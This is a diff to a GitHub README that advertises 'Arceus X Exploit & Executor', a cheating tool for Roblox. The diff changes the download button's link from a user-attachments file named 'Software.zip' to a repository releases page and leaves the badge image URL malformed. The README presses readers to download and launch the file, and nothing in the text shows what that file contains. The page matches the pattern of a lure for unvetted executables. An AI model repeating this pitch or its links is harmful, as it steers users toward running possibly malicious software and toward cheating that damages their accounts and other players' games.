@@ -17,7 +17,7 @@ This repository hosts the Arceus X Exploit & Executor, a cutting-edge cheating t
 
 Ready to elevate your Roblox gaming experience? Click the button below to download the Arceus X Exploit & Executor and unleash your full gaming potential!
 
-[![Download Arceus X](https://img.shields.io/static/v1?label=Download&message=Arceus%20X&color=blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Arceus X](https://github.com/Shadowlord11/Arceus-Executor/releases/tag/v2.0%20X&color=blue)](https://github.com/Shadowlord11/Arceus-Executor/releases/tag/v2.0)
 
 Please note that the downloaded file needs to be launched to start using Arceus X Exploit & Executor.
 
